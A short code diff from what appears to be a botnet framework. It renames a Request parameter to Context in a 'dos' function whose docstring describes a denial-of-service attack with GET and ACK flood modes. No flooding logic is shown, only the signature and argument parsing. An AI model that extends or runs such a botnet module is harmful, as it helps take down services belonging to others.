@@ -6,7 +6,7 @@ import random
 import logging
 import threading
 
-from .. import BotNet, Request, UserException
+from .. import BotNet, Context, UserException
 from ..utils import simple_serializer
 
 _logger = logging.getLogger(f"__{__name__}   ")
@@ -14,7 +14,7 @@ _logger = logging.getLogger(f"__{__name__}   ")
 # TODO: Improve this Script!
 
 @BotNet.default_script(script_version="0.0.1")
-def dos(request: Request) -> str:
+def dos(context: Context) -> str:
     """
     Denial-Of-Service Attack.
 
@@ -28,7 +28,7 @@ def dos(request: Request) -> str:
     GETFlood: send GET request to target
     ACKFlood: send random data to target
     """
-    command, err = simple_serializer(request.command, [str, str, int, int, int])
+    command, err = simple_serializer(context.command, [str, str, int, int, int])
     if err:
         raise UserException(err)
     
